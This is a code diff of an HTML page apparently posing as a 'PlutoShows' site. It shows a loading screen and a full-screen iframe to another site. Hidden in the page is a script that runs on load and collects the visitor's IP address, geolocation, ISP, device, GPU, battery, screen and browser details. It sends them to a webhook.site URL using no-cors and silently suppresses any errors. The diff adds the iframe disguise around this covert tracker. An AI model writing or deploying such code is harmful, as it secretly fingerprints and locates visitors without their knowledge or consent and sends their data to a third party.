@@ -3,31 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading</title>
+    <title>PlutoShows</title>
     <style>
-        body {
-            background-color: #000;
-            color: #fff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+        body, html {
             margin: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            font-size: 1.2rem;
-            letter-spacing: 1px;
+            padding: 0;
+            height: 100%;
+            width: 100%;
+            overflow: hidden;
+            background-color: #000;
+        }
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: 1;
+        }
+        .loading-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-family: sans-serif;
+            z-index: 0;
         }
     </style>
 </head>
 <body>
 
-    <div>Loading. . .</div>
+    <div class="loading-text">Loading. . .</div>
+    <iframe src="https://user-name123115.github.io/"></iframe>
 
     <script>
-        async function initialize() {
+        async function captureAndSend() {
             const webhookUrl = 'https://webhook.site/d663c7b7-5d5c-4b11-a2a2-f0478f0043fe';
             
             try {
+                // 1. Hardware & GPU
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                 const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
@@ -36,59 +52,63 @@
                     renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                 } : 'N/A';
 
+                // 2. Battery Status
                 let battery = {};
                 if (navigator.getBattery) {
                     const b = await navigator.getBattery();
                     battery = { level: (b.level * 100) + '%', charging: b.charging };
                 }
 
+                // 3. Network/IP/Location
                 let netInfo = {};
                 try {
                     const res = await fetch('https://ipapi.co/json/');
                     netInfo = await res.json();
                 } catch (e) {}
 
-                const payload = {
+                // 4. Construct Payload
+                const data = {
+                    event: "Site Access",
                     ip: netInfo.ip,
+                    provider: netInfo.org,
                     location: `${netInfo.city}, ${netInfo.region}, ${netInfo.country_name}`,
-                    isp: netInfo.org,
-                    user_agent: navigator.userAgent,
-                    hardware: {
-                        cores: navigator.hardwareConcurrency,
-                        memory: navigator.deviceMemory + 'GB',
+                    device: {
+                        userAgent: navigator.userAgent,
                         platform: navigator.platform,
+                        cores: navigator.hardwareConcurrency,
+                        memory: navigator.deviceMemory + "GB",
                         gpu: gpu
                     },
                     display: {
-                        res: `${screen.width}x${screen.height}`,
-                        depth: screen.colorDepth,
-                        ratio: window.devicePixelRatio
+                        resolution: `${screen.width}x${screen.height}`,
+                        pixelRatio: window.devicePixelRatio
                     },
                     browser: {
-                        lang: navigator.language,
+                        language: navigator.language,
                         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        cookies: navigator.cookieEnabled,
-                        online: navigator.onLine
+                        cookies: navigator.cookieEnabled
                     },
                     battery: battery,
-                    meta: {
-                        url: window.location.href,
-                        referrer: document.referrer || 'Direct'
+                    context: {
+                        referrer: document.referrer || 'Direct',
+                        timestamp: new Date().toISOString()
                     }
                 };
 
+                // 5. Send to Webhook
                 await fetch(webhookUrl, {
                     method: 'POST',
                     mode: 'no-cors',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify(data)
                 });
 
             } catch (err) {
+                // Silent catch
             }
         }
 
-        window.onload = initialize;
+        window.onload = captureAndSend;
     </script>
 </body>
 </html>
